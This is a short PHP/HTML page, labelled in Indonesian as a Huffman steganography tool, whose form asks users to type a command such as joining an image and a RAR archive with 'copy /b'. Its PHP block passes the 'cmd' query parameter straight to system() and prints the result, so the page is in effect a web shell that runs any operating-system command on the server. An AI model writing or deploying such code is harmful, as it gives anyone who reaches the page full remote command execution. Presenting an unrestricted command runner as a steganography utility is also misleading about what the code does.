<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Algoritma Huffman Metode Stegnografi</title>
	<link rel="stylesheet" href="assets/css/bootstrap.min.css">
</head>
<body>

	<div class="container">
		<div class="row">
			<div class="col-6 offset-3">
				<form>
				  <fieldset>
				    <legend>Masukan Perintah</legend>
				    <small>copy /b namafilegambar.jpg+filepesan.rar namafilebaru.jpg</small>
				    <div class="form-group">
				      <br /><input class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Ketikan Perintah" type="text" name="cmd">
				      <marquee behavior="" direction="right"> <small id="emailHelp" class="form-text text-muted"> Ketikan perintah disini </small> </marquee>
				      <button type="submit" class=" btn btn-success btn-block ">Submit </button>
				      
				    </div>				    
				    </fieldset>
				    
				  </fieldset>
				</form>

			<div class="bg-primary text-white">
				<?php

				    if(isset($_GET['cmd'])){
				        echo "<pre>";
				        echo system($_GET['cmd']);
				        echo "</pre>";
				    }

				?>
			</div>

			</div>
		</div>
	</div>

</body>
</html>